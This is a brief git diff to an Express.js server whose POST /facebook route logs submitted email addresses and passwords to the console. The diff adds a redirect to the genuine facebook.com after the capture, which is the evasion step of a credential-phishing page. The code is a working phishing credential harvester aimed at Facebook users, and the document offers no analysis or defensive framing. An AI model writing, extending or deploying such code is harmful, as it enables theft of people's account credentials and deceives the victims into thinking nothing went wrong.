@@ -13,7 +13,9 @@ app.get("/", (req, res) => {
 app.post("/facebook", (req, res) => {
   console.log("Email:", req.body.email);
   console.log("Password: ", req.body.password);
+  return res.redirect('http://www.facebook.com');
   res.end()
+  
 });
 
 app.listen(3000, "0.0.0.0", err => {
